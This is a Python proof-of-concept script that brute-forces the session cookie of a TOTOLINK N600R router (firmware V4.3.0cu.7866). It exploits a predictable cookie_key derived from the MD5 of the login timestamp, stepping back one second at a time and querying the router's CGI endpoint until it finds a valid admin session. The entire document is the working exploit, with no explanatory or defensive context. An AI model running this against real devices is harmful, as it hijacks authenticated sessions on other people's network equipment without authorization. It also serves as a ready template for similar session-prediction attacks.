#!/usr/bin/env python3
"""
TOTOLINK N600R V4.3.0cu.7866
cookie_key = md5(time(NULL))
"""
import hashlib
import time

import requests

target = "http://192.168.0.1"
seconds = int(time.time())

print(f"[*] Current timestamp: {seconds}")

while True:
    seconds -= 1
    token = hashlib.md5(str(seconds).encode()).hexdigest()

    response = requests.post(
        f"{target}/cgi-bin/cstecgi.cgi",
        json={"topicurl": "setting/getSysStatusCfg"},
        cookies={"cookie_key": token},
        timeout=3,
    )

    print(f"[*] Trying timestamp={seconds}, cookie_key={token}, status={response.status_code}")

    if response.status_code == 200 and "token invalid" not in response.text:
        print(f"[+] Found valid session!")
        print(f"[+] timestamp={seconds}")
        print(f"[+] cookie_key={token}")
        break
